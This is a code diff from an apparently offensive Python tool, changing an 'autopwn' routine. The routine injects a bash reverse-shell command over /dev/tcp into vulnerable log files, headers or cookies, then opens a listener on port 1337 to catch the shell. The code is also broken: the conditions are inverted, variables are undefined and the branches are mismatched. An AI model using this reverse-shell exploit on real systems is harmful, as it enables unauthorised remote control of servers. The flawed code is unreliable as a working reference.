@@ -67,34 +67,33 @@ class Payload:
 
 	def autopwn(self, attempt_shell, cookieres, headerres, logres):
 		payload = f"bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
-		if headerres and cookieres and logres == False:
-			if cookieres and headerres and logres == False:
-				print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
-				return
-			print(colored("[+] RCE Detected!", 'green'))
-			if logres:
-				# We don't have to gain rce from all the verified rce vectors. We just need one!
-				log = logres[0]
-				print(colored(f"[+] Attempting to pwn through vulnerable log file: {log}", 'green'))
-				exploit = log + f'&cmd='
+		if cookieres or headerres or logres == False:
+			print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
+			return
+		print(colored("[+] RCE Detected!", 'green'))
+		if logres:
+			# We don't have to gain rce from all the verified rce vectors. We just need one!
+			log = logres[0]
+			print(colored(f"[+] Attempting to pwn through vulnerable log file: {log}", 'green'))
+			exploit = log + f'&cmd='
 				
-			elif headerres:
-				malheaders = headerres[0][:-2] + payload 
-				print(colored(f"[+] Attempting to pwn through vulnerable header: {header}", 'green'))
+		elif headerres:
+			malheaders = headerres[0][:-2] + payload 
+			print(colored(f"[+] Attempting to pwn through vulnerable header: {header}", 'green'))
 
-			elif cookieres:
-				malreq = headerres[0][:-2] + payload
-				print(colored(f"[+] Attempting to pwn through vulnerable cookie: {cookie}", 'green'))
+		elif cookieres:
+			malreq = headerres[0][:-2] + payload
+			print(colored(f"[+] Attempting to pwn through vulnerable cookie: {cookie}", 'green'))
 
 
-			ExploitThread = threading.Thread(target=InvokeShell, args=(exploit,)) #Dev note: If this crashes add self,
-			ExploitThread.start()
-			print("[!] If you don't receive a webshell in 10 seconds, the exploit failed.", 'red')
-			# Spin up the listener to catch the revshell and fire out the exploit
-			l = listen(1337)
-			conn = l.wait_for_connection()
-			l.interactive()
-			print("[*] Session Closed.")
+		ExploitThread = threading.Thread(target=InvokeShell, args=(exploit,)) #Dev note: If this crashes add self,
+		ExploitThread.start()
+		print("[!] If you don't receive a webshell in 10 seconds, the exploit failed.", 'red')
+		# Spin up the listener to catch the revshell and fire out the exploit
+		l = listen(1337)
+		conn = l.wait_for_connection()
+		l.interactive()
+		print("[*] Session Closed.")
 
 
 
